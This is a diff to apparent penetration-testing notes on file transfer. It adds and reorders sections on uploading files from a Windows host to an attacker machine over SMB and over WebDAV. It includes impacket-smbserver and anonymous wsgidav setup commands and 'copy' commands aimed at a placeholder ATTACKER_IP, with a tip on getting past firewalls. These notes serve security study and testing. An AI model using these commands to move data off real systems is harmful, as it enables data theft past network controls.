@@ -30,6 +30,49 @@ md5sum file
 
 This method is reliable when network uploads are restricted.
 
+
+
+---
+
+## SMB Uploads 
+
+An SMB share can be created on the attacker machine and remotely upload the file from Windows.
+
+### SMB Server Setup
+
+```bash
+sudo impacket-smbserver share ./smbshare -smb2support
+```
+
+### Upload from Windows
+
+```cmd
+copy file.zip \\ATTACKER_IP\share\
+```
+
+
+
+---
+
+## SMB Uploads via WebDAV (SMB over HTTP)
+
+WebDAV allows file transfers over HTTP when SMB is blocked.
+
+### WebDAV Server Setup
+
+```bash
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+### Upload from Windows
+
+```cmd
+copy file.zip \\ATTACKER_IP\DavWWWRoot\
+```
+
+WebDAV uses HTTP, which is more likely to be allowed through firewalls.
+
+
 ---
 
 ## PowerShell Web Uploads
@@ -74,25 +117,6 @@ echo <BASE64> | base64 -d > file
 
 This is simple but noisy and manual.
 
----
-
-## SMB Uploads via WebDAV (SMB over HTTP)
-
-WebDAV allows file transfers over HTTP when SMB is blocked.
-
-### WebDAV Server Setup
-
-```bash
-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
-```
-
-### Upload from Windows
-
-```cmd
-copy file.zip \\ATTACKER_IP\DavWWWRoot\
-```
-
-WebDAV uses HTTP, which is more likely to be allowed through firewalls.
 
 ---
 
